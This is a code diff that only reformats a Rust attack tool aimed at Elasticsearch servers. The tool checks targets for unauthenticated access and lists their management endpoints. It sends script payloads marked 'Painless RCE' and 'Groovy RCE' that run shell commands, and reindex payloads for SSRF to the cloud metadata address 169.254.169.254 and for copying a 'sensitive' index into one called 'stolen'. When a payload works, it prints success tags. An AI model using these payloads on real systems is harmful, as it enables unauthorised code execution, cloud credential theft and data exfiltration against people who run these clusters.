@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -18,16 +22,31 @@ pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
     let body = resp.text().await.unwrap_or_default();
 
     if status == 200 && (body.contains("cluster_name") || body.contains("elasticsearch")) {
-        println!("  {} Open Elasticsearch instance found!", "[!]".red().bold());
+        println!(
+            "  {} Open Elasticsearch instance found!",
+            "[!]".red().bold()
+        );
         println!("  {} Cluster info:", "[*]".cyan().bold());
         for line in body.lines().take(10) {
             println!("    {}", line);
         }
     } else {
-        println!("  {} Elasticsearch not exposed or requires auth.", "[-]".green().bold());
+        println!(
+            "  {} Elasticsearch not exposed or requires auth.",
+            "[-]".green().bold()
+        );
     }
 
-    let endpoints = ["/_cat/health", "/_cat/indices", "/_cat/nodes", "/_cat/shards", "/_cluster/health", "/_cluster/settings", "/_nodes", "/_all/_settings"];
+    let endpoints = [
+        "/_cat/health",
+        "/_cat/indices",
+        "/_cat/nodes",
+        "/_cat/shards",
+        "/_cluster/health",
+        "/_cluster/settings",
+        "/_nodes",
+        "/_all/_settings",
+    ];
     println!("\n  {} Checking management endpoints:", "[*]".cyan().bold());
     for ep in &endpoints {
         let target = format!("{}{}", url.trim_end_matches('/'), ep);
@@ -100,21 +119,43 @@ pub async fn script(url: &str, timeout: u64) -> anyhow::Result<()> {
 
     let client = build_client(timeout);
     let payloads = [
-        ("Painless hello", r#"{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"1+1"}}}}"#),
-        ("Painless RCE", r#"{"query":{"match_all":{}},"script_fields":{"exec":{"script":{"source":"Runtime.getRuntime().exec('id')"}}}}"#),
-        ("Groovy RCE", r#"{"query":{"match_all":{}},"script_fields":{"exec":{"script":{"lang":"groovy","source":"'id'.execute().text"}}}}"#),
+        (
+            "Painless hello",
+            r#"{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"1+1"}}}}"#,
+        ),
+        (
+            "Painless RCE",
+            r#"{"query":{"match_all":{}},"script_fields":{"exec":{"script":{"source":"Runtime.getRuntime().exec('id')"}}}}"#,
+        ),
+        (
+            "Groovy RCE",
+            r#"{"query":{"match_all":{}},"script_fields":{"exec":{"script":{"lang":"groovy","source":"'id'.execute().text"}}}}"#,
+        ),
         ("Search template", r#"{"id":"_search","params":{}}"#),
-        ("Stored script", r#"{"script":{"lang":"painless","source":"doc['field'].value*2"}}"#),
+        (
+            "Stored script",
+            r#"{"script":{"lang":"painless","source":"doc['field'].value*2"}}"#,
+        ),
     ];
 
     for (name, payload) in &payloads {
         let target = format!("{}/_search", url.trim_end_matches('/'));
-        match client.post(&target).header("Content-Type", "application/json").body(*payload).send().await {
+        match client
+            .post(&target)
+            .header("Content-Type", "application/json")
+            .body(*payload)
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
                 let success = status == 200 && !text.contains("error");
-                let tag = if success { "SCRIPT EXECUTED".red().bold().to_string() } else { format!("status={}", status) };
+                let tag = if success {
+                    "SCRIPT EXECUTED".red().bold().to_string()
+                } else {
+                    format!("status={}", status)
+                };
                 println!("  {} {:25} {}", "*".cyan(), name, tag);
             }
             Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
@@ -132,20 +173,42 @@ pub async fn reindex(url: &str, timeout: u64) -> anyhow::Result<()> {
 
     let client = build_client(timeout);
     let payloads = [
-        ("SSRF via reindex", r#"{"source":{"remote":{"host":"http://169.254.169.254:80"},"index":"*"},"dest":{"index":"exfil"}}"#),
-        ("Data manipulation", r#"{"source":{"index":"sensitive"},"dest":{"index":"stolen"}}"#),
-        ("Pipeline injection", r#"{"source":{"index":"logs"},"dest":{"index":"modified"},"pipeline":"inject_script"}}"#),
-        ("Remote reindex", r#"{"source":{"remote":{"host":"http://internal-elasticsearch:9200"},"index":"*"},"dest":{"index":"bridge"}}"#),
+        (
+            "SSRF via reindex",
+            r#"{"source":{"remote":{"host":"http://169.254.169.254:80"},"index":"*"},"dest":{"index":"exfil"}}"#,
+        ),
+        (
+            "Data manipulation",
+            r#"{"source":{"index":"sensitive"},"dest":{"index":"stolen"}}"#,
+        ),
+        (
+            "Pipeline injection",
+            r#"{"source":{"index":"logs"},"dest":{"index":"modified"},"pipeline":"inject_script"}}"#,
+        ),
+        (
+            "Remote reindex",
+            r#"{"source":{"remote":{"host":"http://internal-elasticsearch:9200"},"index":"*"},"dest":{"index":"bridge"}}"#,
+        ),
     ];
 
     for (name, payload) in &payloads {
         let target = format!("{}/_reindex", url.trim_end_matches('/'));
-        match client.post(&target).header("Content-Type", "application/json").body(*payload).send().await {
+        match client
+            .post(&target)
+            .header("Content-Type", "application/json")
+            .body(*payload)
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
                 let success = status == 200 && !text.contains("error");
-                let tag = if success { "REINDEX SUCCESS".red().bold().to_string() } else { format!("status={}", status) };
+                let tag = if success {
+                    "REINDEX SUCCESS".red().bold().to_string()
+                } else {
+                    format!("status={}", status)
+                };
                 println!("  {} {:25} {}", "*".cyan(), name, tag);
             }
             Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
